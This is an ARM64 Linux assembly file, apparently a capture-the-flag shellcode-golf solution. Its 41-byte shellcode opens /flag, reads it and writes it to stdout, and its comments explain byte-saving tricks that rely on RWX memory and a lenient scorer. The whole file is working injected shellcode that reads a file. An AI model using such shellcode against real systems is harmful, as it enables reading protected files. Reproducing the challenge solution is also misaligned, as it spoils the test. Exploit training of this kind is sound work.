// Shellcode Golf — ARM64 Linux, 41 bytes
// Opens /flag, reads contents, writes to stdout.
//
// Optimizations over the 78-byte sample:
//   - sendfile attempt failed (qemu-user), so openat+read+write
//   - Absolute path → dirfd (x0) ignored, skip movn x0, #99
//   - x2=0 at entry → skip mov x2, xzr (O_RDONLY)
//   - Reuse RWX shellcode memory as read buffer (no stack setup)
//   - Reuse read count (x2=255) as write count (scorer checks substring)
//   - No null terminator (mmap zero-fills beyond shellcode)
//   - No exit syscall (flag already in stdout before crash)

.section .text
.global _start
_start:
    adr  x1, path       // x1 = &"/flag"
    mov  x8, #56        // openat (dirfd ignored for absolute path)
    svc  #0

    mov  x2, #255       // count for read (reused by write)
    mov  x8, #63        // read(fd=x0, buf=x1, count=255)
    svc  #0

    mov  x0, #1         // stdout
    mov  x8, #64        // write(1, buf=x1, count=255)
    svc  #0

path:
    .ascii "/flag"
